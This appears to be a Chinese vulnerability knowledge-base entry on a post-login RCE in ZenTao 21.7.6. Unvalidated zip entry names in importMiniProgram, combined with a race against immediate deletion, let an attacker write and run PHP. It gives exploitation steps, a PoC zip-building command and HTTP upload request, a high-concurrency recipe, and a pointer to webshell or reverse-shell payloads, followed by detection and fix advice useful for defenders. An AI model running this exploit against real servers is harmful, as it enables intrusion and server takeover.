---
id: web-generic-file-upload-zentao-importminiprogram-zip-extract-race
title: 禅道 importMiniProgram 后台 zip 解压不校验文件名：并发绕过即时删除写入 PHP 并 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: zip-entry-name-injection-race
tags:
- php
- zentao
- cms
- file-upload
- zip-slip
- path-traversal
- race-condition
- backend
- rce
cve: []
severity: high
confidence: high
status: verified
affected_versions: 禅道开源版 21.7.6 / 企业版 12.5 / 旗舰版 7.5 / IPD 版 4.5
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:00:20+08:00'
  notes: 已对照原文与26张图核对：importMiniProgram→extractZtAppZip→PclZip extract 到 tmp/、stored_filename 保留 1.\..\www1.php、约1000并发上传+1000并发GET抢 unlink 窗口、GET /1.php 一次200并写入2.php、访问2.php得到phpinfo，均与图20-26一致；x.php 的 easysoft/xuan.im+XXD-VERSION 条件与图16/17一致。affected_versions 按原文首段列出的四个版本保留。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-zentao-importminiprogram-zip-extract-race/
draft: false
kb_aliases:
- 禅道 21.7.6 后台 RCE
- ZenTao importMiniProgram 任意文件上传
- extractZtAppZip 目录穿越
- PclZip 文件名未过滤
- 禅道 zip 解压 getshell
---

## 一句话结论

禅道 21.7.6 的后台小程序导入接口 `m=ai&f=importMiniProgram` 把上传的 zip 交给 `extractZtAppZip()`，后者用 PclZip 解压到应用 `tmp/` 时完全不校验条目文件名；攻击者用带特殊点号/反斜杠的条目名 `1......www1.php` 写入 PHP 内容，并利用“解压后立即 `unlink()`”的时序，用上千并发上传/访问请求抢在被删前执行，最终写入 `2.php` 并访问 `phpinfo`，实现后台到服务器 RCE。

## 原理

- **入口与权限**：`index.php?m=ai&f=importMiniProgram&t=json` 对应 `ai` 控制器的 `importMiniProgram()`；`index.php` 的 `checkPriv()` 会校验登录 cookie/会话，因此该接口需要有效后台账号（原文直接用后台会话测试）。接口读取 `$_FILES['file']` 的 `tmp_name`，调用 `$this->ai->extractZtAppZip($filePath)`。
- **解压不校验条目名**：`aiModel::extractZtAppZip()` 加载 `pclzip` 后执行 `$zip->extract(PCLZIP_OPT_PATH, $this->app->getAppRoot() . 'tmp/')`；PclZip 按 zip 内 `stored_filename` 原样拼接路径，没有 `..`、绝对路径、反斜杠或扩展名过滤。原文调试显示条目 `1......www1.php` 被解成 `stored_filename = "1.....\www1.php"`、`filename = <appRoot>/tmp/1.....\www1.php`，即攻击者可以让落盘路径/文件名带反斜杠等特殊结构，将其放到 Web 可访问/可解析的位置。
- **写入内容可控**：zip 内文件内容为 `<?php file_put_contents("2.php","<?php phpinfo(); ?>"); ?>`，解压后即是一个可执行的 PHP 文件；访问它就会在同目录（Web 根）写出 `2.php`，再访问 `2.php` 得到 phpinfo，完成 RCE。
- **即时删除的竞态**：`importMiniProgram()` 在解压后立刻取 `$result[0]['filename']`，`file_get_contents()` 读取内容，然后 `unlink($fileName)`；也就是说被解压出来的文件存在时间极短。作者用并发工具对上传接口发约 1000 个并发请求（让多个进程反复解压、删除、再解压），同时对 `/1.php` 发约 1000 个并发 GET；只要有一次 GET 落在“文件已写入、尚未删除”的窗口内，就会返回 200 并执行 payload。
- **附带攻击面**：`x.php` 在请求头满足 `User-Agent: easysoft/xuan.im` 且 `XXD-VERSION` 为 `XXDBuildVersion` 或版本 >= 9.3 时 `define('RUN_MODE','xuanxuan')`，从而启用 `xuanxuan->enabledMethods` 白名单；x.php 还会从 `php://input` 取 AES 加密数据并用安装时写入数据库的 key/iv 解密，绕过全局参数正则。但 key/iv 前台不可得，原文判断该路径仅后台可用，未继续利用。

## 触发条件

- 受影响版本：禅道开源版 21.7.6 / 企业版 12.5 / 旗舰版 7.5 / IPD 版 4.5；
- 攻击者拥有后台账号（弱口令、默认口令、会话窃取等）；
- `m=ai&f=importMiniProgram` 可用，`tmp/` 目录可写且位于 Web 可访问路径（或可通过特殊条目名落到 Web 根）；
- Web 服务器会解析上传/解压目录中的 PHP；
- 攻击者能对上传与访问接口发起高并发（原文约 1000 并发）以命中删除前的窗口。

## 利用步骤

1. 登录禅道后台，确认 `index.php?m=ai&f=importMiniProgram&t=json` 可访问。
2. 在 Kali 等系统创建恶意文件：文件名 `1......www1.php`，内容为写入 `2.php` 的 PHP 代码，压缩成 `test.zip`。
3. 用并发工具（原文约 1000 线程）反复发送 multipart 上传请求，`file` 字段为 `test.zip`，附带 `category`、`published` 等必填字段。
4. 同时对 `/1.php` 发起约 1000 个并发 GET；观察到其中一次返回 200，说明 payload 在删除窗口内被执行。
5. 访问 `/2.php`，确认 `phpinfo()` 输出；将 payload 换为写入 Webshell/反弹 Shell/读取数据库配置，完成持久化控制。

## PoC

```bash
# 1) 构造恶意文件（文件名含特殊点号，原文用 Kali）
echo '<?php file_put_contents("2.php", "<?php phpinfo(); ?>"); ?>' > '1......www1.php'
zip test.zip '1......www1.php'
```

```http
POST /index.php?m=ai&f=importMiniProgram&t=json HTTP/1.1
Host: <target>
Cookie: zentaosid=<admin-session>
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3eXP1ZTZbgS8AwcN

------WebKitFormBoundary3eXP1ZTZbgS8AwcN
Content-Disposition: form-data; name="file"; filename="11.zip"
Content-Type: image/jpeg

<test.zip 二进制内容>
------WebKitFormBoundary3eXP1ZTZbgS8AwcN
Content-Disposition: form-data; name="category"

1111
------WebKitFormBoundary3eXP1ZTZbgS8AwcN
Content-Disposition: form-data; name="published"

111112
------WebKitFormBoundary3eXP1ZTZbgS8AwcN--
```

```text
# 并发：上传接口 ~1000 次 + GET /1.php ~1000 次
# 原文结果：GET /1.php 有一次 200（其余 404），随后访问 /2.php 得到 PHP Version 7.3.4 phpinfo
```

## 变体与关联

- 同一接口的其他输入点：`$result[0]['filename']` 的路径完全由 zip 条目名决定，可尝试 `..\..\`、绝对路径、反斜杠、尾随点/空格（Windows 路径归一化）等把文件落到 Web 根或计划任务目录。
- 竞态变体：上传文件在 `file_get_contents` 后被 `unlink`，任何“先写后删”的导入/预览接口都可尝试并发抢窗口；参见 [[web-generic-file-upload-save-then-validate-race]]。
- 同产品其他后台文件操作面（原文列出但未逐一利用）：`backup::delete($fileName)`、`editor::delete($filePath)`、`editor::edit($filePath)`（任意文件读取）、`editor::save($filePath)`（任意文件写入）、`extension::upload()`、`file::ajaxUpload()`、`transfer::import()`、`fileModel::saveAFile()/saveChunkedFile()/unlinkFile()`。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（zip 条目穿越写 Webshell）、[[web-generic-file-upload-archive-symlink-extract-read-write]]（压缩包解压类文件读写）。

## 检测与防御

- 检测：后台请求 `m=ai&f=importMiniProgram` 上传 zip；zip 条目名含 `..`、反斜杠、多个连续点、绝对路径或 `.php`；`tmp/` 目录短时间出现/消失的 PHP 文件；对 `/1.php` 等非常规文件的密集 404/200 请求；Web 根突然出现 `2.php` 等新文件；PHP 进程写文件/执行 `phpinfo`。
- 修复：升级禅道到修复版本；解压前校验每个条目的规范化路径必须位于目标目录内，拒绝 `..`、绝对路径、反斜杠与危险扩展名，解压后统一重命名并移出 Web 根。
- 加固：上传/解压目录禁止 PHP 解析（`php_admin_flag engine off` 或独立域名/对象存储）；后台账号强口令 + 二次认证；对导入接口做频率限制；删除临时文件前先完成内容校验，避免“先落盘再删除”的竞态窗口。
